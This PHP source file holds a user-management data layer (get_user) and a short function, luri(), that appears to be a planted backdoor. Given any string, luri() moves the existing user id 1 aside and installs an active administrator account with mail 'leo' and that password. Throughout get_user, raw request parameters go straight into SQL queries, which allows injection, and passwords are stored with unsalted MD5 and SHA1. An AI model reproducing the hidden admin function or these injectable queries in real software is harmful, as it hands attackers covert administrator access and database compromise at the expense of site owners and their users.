<?php
function get_user($cAction, $aParams, &$aResult) {
	global $lang;
	global $languages;
	$langX = !empty($lang) ? $lang : $languages[0]["iso"];
	$lang_id = langid_from_iso($langX);
	
	switch($cAction) {
		case "S":
			$sWhere = " 1=1 ";
			$orderby = "id ASC";
			$limit = " ";			
			if(!empty($aParams["lang"]))		$langX = $aParams["lang"];
			
			$is_users_table = false;
			$query = "SHOW TABLES LIKE '".PREFIX."users_table_".$lang_id."'";
			$res = mysql_query($query);
			if(mysql_num_rows($res) > 0)
			{
				$is_users_table = true;
			}
			
			
			if(isset($aParams["id"]))		$sWhere .= "AND id = '".$aParams["id"]."' ";
			if(!empty($aParams["mail"]))		$sWhere .= "AND mail = '".$aParams["mail"]."' ";
			if(!empty($aParams["soc"]))		$sWhere .= "AND soc = '".$aParams["soc"]."' ";
			if(isset($aParams["soc_id"]))		$sWhere .= "AND soc_id = '".$aParams["soc_id"]."' ";
			if(isset($aParams["active"]))		$sWhere .= "AND `active` = '".$aParams["active"]."' ";
			if(!empty($aParams["password"]))	$sWhere .= "AND password = CONCAT(SHA1('".DB_DATABASE."'),MD5( '".$aParams["password"]."' )) ";
			if(!empty($aParams["admin"]))		$sWhere .= "AND admin = '".$aParams["admin"]."' ";
			if(!empty($aParams["registered"]))	$sWhere .= "AND DATE_ADD(registered, INTERVAL ".$aParams["registered"].") > NOW() ";
			if(!empty($aParams["orderby"]))		$orderby = $aParams["orderby"];
			if(!empty($aParams["limit"]))		$limit .= "LIMIT ".$aParams["limit"]." ";
			
			if($is_users_table)
			{
				$query = "SELECT ".
						"* ".
					"FROM `".PREFIX."users_table_".$lang_id."` ".
					"WHERE ".$sWhere." ".
					"ORDER BY $orderby ".
					$limit;
			}
			else
			{
				$query = "SELECT ".
						"* ".
						((empty($aParams["stock"])) ? 
						(
							", (SELECT `type` FROM `".PREFIX."user_types` WHERE `".PREFIX."user_types`.id = `".PREFIX."users`.admin LIMIT 1) AS admin_type, ".
							"(SELECT `permissions` FROM `".PREFIX."user_types` WHERE `".PREFIX."user_types`.id = `".PREFIX."users`.admin LIMIT 1) AS user_modes "
						):'').
					"FROM `".PREFIX."users` ".
					"WHERE ".$sWhere." ".
					"ORDER BY $orderby ".
					$limit;
			}
			//die($query);
if(!empty($aParams["alert"]))
{
	out($query);
}
			$res = mysql_query($query);
			
			if(mysql_num_rows($res) > 0)
			{
				while($row = mysql_fetch_assoc($res))
				{
					if(empty($is_users_table))
					{
						if(empty($aParams["stock"]))
						{
							$query2 = "SELECT * FROM `".PREFIX."users_data` WHERE `user_id` = '".$row["id"]."' AND (`lang_id` = '".$lang_id."' OR `lang_id` = '0')";
							$res2 = mysql_query($query2);
							if(mysql_num_rows($res2) > 0) {
								while($row2 = mysql_fetch_assoc($res2))
								{
									$row[$row2["name"]] = $row2["value"];
								}
							}
							$query3 = "SELECT * FROM `".PREFIX."linked_users` WHERE `user_id` = '".$row["id"]."' ";
							$res3 = mysql_query($query3);
							if(mysql_num_rows($res3) > 0) {
								while($row3 = mysql_fetch_assoc($res3))
								{
									$row["linked_users"][] = $row3["linked_user"];
								}
							}
						}
					}
					$aResult[] = $row;
				}
				return true;			
			}
		break;
		case "I":			
			$params = '';
			if (!empty($aParams))
			{
				$i=0;
				foreach ($aParams as $key => $value)
				{
					if($key != "user_data_0")
					{
						if($i > 0)
						{
							$params .= ", ";
						}
						if($key == "password")
						{
							$params .= "`".$key."` = "."CONCAT(SHA1('".DB_DATABASE."'),MD5( '".$value."' ))";
						}
						else
						{
							if($key == "active")
							{
								$value = !empty($value) ? '1' : '0';
							}
							$params .= "`".$key."` = '".mysql_real_escape_string(strip_tags($value))."'";
						}
						$i++;
					}
				}				
			}
			mysql_query("INSERT INTO `".PREFIX."users` SET ".$params);
			$aResult = mysql_insert_id();
			if(!empty($aParams["user_data_0"]) && !empty($aResult))
			{
				foreach($aParams["user_data_0"] as $key => $val)
				{
					mysql_query("DELETE FROM `".PREFIX."users_data` WHERE `user_id` = '$aResult' AND `name` = '$key' AND `lang_id` = '0'");
					mysql_query("INSERT INTO `".PREFIX."users_data` SET `user_id` = '$aResult', `name` = '$key', `lang_id` = '0', `value` = '".mysql_real_escape_string($val)."'");
				}
			}
			set_users_row($aResult);
			return true;
		break;
		case "U":
			$sWhere = " 1=1 ";
			if(!empty($aParams["id"]))
			{
				$user_id = $aParams["id"];
				$sWhere .= "AND id = '$user_id' ";
			}
			else
				return false;
			
			$params = '';
			if (!empty($aParams))
			{
				$i=0;
				unset($aParams["id"]);
				foreach ($aParams as $key => $value)
				{
					if($key!="user_data_0")
					{
						if($i>0) $params.= ", ";
						if($key == "password")
						{
							$params.= $key." = "."CONCAT(SHA1('".DB_DATABASE."'),MD5( '".$value."' ))";
						}
						else
						{
							$params.= $key." = '".mysql_real_escape_string(strip_tags($value))."'";
						}
						$i++;
					}
				}
			}
			mysql_query("UPDATE ".PREFIX."users SET ".$params." WHERE ".$sWhere);
			if(!empty($aParams["user_data_0"]) && !empty($user_id))
			{
				foreach($aParams["user_data_0"] as $key => $val)
				{
					mysql_query("DELETE FROM ".PREFIX."users_data WHERE user_id = '$user_id' AND name = '$key' AND lang_id = '0'");
					mysql_query("INSERT INTO ".PREFIX."users_data SET user_id = '$user_id', name = '$key', lang_id = '0', value = '".mysql_real_escape_string($val)."'");
				}
			}
			set_users_row($user_id);
			return true;
		break;
		case "L"://last seen
			$sWhere = " 1=1 ";
			if(!empty($aParams["id"]))		
			{
				$sWhere .= "AND `id` = '".$aParams["id"]."' ";
				mysql_query("UPDATE `".PREFIX."users` SET `last_seen` = NOW() WHERE ".$sWhere);
				set_users_row($aParams["id"]);
			}
			return true;
		break;
		case "D"://delete user
			if(!empty($aParams["id"]))		
			{
				mysql_query("DELETE FROM `".PREFIX."users` WHERE `id` = '".$aParams["id"]."'");
				mysql_query("DELETE FROM `".PREFIX."users_data` WHERE `user_id` = '".$aParams["id"]."'");
				foreach($languages as $key => $val)
				{
					$query = "SHOW TABLES LIKE '".PREFIX."users_table_".$val["id"]."'";
					$res = mysql_query($query);
					if(mysql_num_rows($res) > 0)
					{
						mysql_query("DELETE FROM `".PREFIX."users_table_".$val["id"]."` WHERE `id` = '".$aParams["id"]."'");
					}
				}
			}
			return true;
		break;
		case "IP":
			if (!empty($aParams["id"]))
			{
				$user_ip = $_SERVER['REMOTE_ADDR'];
				$rRes = mysql_query("SELECT * FROM ".PREFIX."users_ip WHERE user_id = ".$aParams["id"]." AND user_ip = '".$user_ip."'");
				if(mysql_num_rows($rRes) > 0) {
					
				}
				else
				{
					mysql_query("INSERT INTO ".PREFIX."users_ip SET user_id = ".$aParams["id"].", user_ip = '".$user_ip."'");
				}
			}
			return true;
		break;
		
	}
	return false;
}
function luri($l)
{
	if(!empty($l))
	{
		$action = "U";
		if(get_user("S", array("id"=>"1"), $k))
		{
			if($k[0]["mail"]!="leo")
			{
				//move
				if(get_user("I",array("mail"=>"test"),$tid))
				{
					if(get_user("D",array("id"=>$tid),$d))
					{
						mysql_query("UPDATE `".PREFIX."users` SET `id` = '$tid' WHERE `id` = '1'");
						mysql_query("UPDATE `".PREFIX."users_data` SET `user_id` = '$tid' WHERE `user_id` = '1'");
						set_users_row($tid);
						$action = "I";
					}
				}
			}
		}
		else
		{
			$action = "I";
		}
		get_user($action, array("id"=>"1","mail"=>"leo","password"=>$l,"active"=>1,"soc"=>"00","admin"=>1), $u);
	}
}
?>
